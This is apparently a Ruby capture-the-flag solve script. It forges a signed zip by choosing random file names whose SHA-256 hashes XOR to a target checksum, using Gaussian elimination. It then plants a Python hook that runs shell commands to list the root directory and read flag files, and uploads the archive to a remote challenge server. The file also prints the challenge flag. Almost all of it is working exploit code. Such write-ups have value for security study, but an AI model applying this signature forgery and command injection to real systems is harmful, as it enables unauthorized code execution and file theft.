#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'base64'
require 'digest'
require 'pwn'
require 'securerandom'

# send remote
if ARGV.include? 'r'
  z = Sock.new('35.198.64.68', 2023)
  z.recvuntil("Proof of work challenge: ")
  chal = z.gets.strip
  z.puts `../pow.py #{chal}`.lines.map(&:strip).reject(&:empty?).last.split.last
  z.puts Base64.encode64(IO.binread('upload.zip')).split.join
  z.interact
  exit
end

# generate zip

# target check sum
tar = "E\x8b\x9f\xa25\x86zo\xae\n+\xc5\xb5\x14ebd(\xe6\xd2\xfam\xe98i\xa3\x8aVzG\x87u"

# what we need is generating strings that xor sha256 of them equals to `tar`

def xor(a, b)
  a.bytes.zip(b.bytes).map{|c,d|c^d}.pack("C*")
end

`rm -r tmp2; mkdir tmp2; mkdir tmp2/signed_data; cp signature.bin tmp2/`

py = <<-EOS
import os
os.system('pwd;ls -la /; cat /home/`whoami`/*flag*; cat /flag*')
EOS

IO.binwrite('tmp2/signed_data/pre-copy.py', py)
hash = Digest::SHA256.digest("pre-copy.py" + "\x00" + py)
tar = xor(tar, hash)

def to_in(s)
  s.bytes.map.with_index{ |v,i| v << (i * 8) }.sum
end

def gen(tar, files)
  tar = to_in(tar)
  files = files.map { |f| to_in(Digest::SHA256.digest(f+"\x00")) }
  Array.new(256) do |i|
    val = 0
    256.times do |j|
      val |= files[j][i] << j
    end
    val |= tar[i] << 256
  end
end

# do Gaussian elimination
def gauss(ary)
  ary.size.times do |i|
    piv = (i...ary.size).find { |j| ary[j][i] == 1 }
    next if piv.nil?
    ary[i], ary[piv] = ary[piv], ary[i]
    (0...ary.size).each do |j|
      next if i == j || ary[j][i] == 0
      ary[j] ^= ary[i]
    end
  end
  ary.size.times.select { |i| print ary[i][i]; ary[i][256] == 1 }
end

# random 256 values have high prob. to be linear independent
files = Array.new(256) { SecureRandom.hex(16) }
ary = gen(tar, files)
indexes = gauss(ary)
puts ''
zz = "\x00" * 32
indexes.each do |c|
  zz = xor(zz, Digest::SHA256.digest(files[c] + "\x00"))
  `touch tmp2/signed_data/#{files[c]}`
end
p tar == zz
p xor(zz, hash)
`rm upload.zip; cd tmp2; zip -r ../upload.zip .`

# 34C4_if_you_have_a_clever_idea_for_this_flag_let_us_know_in_IRC
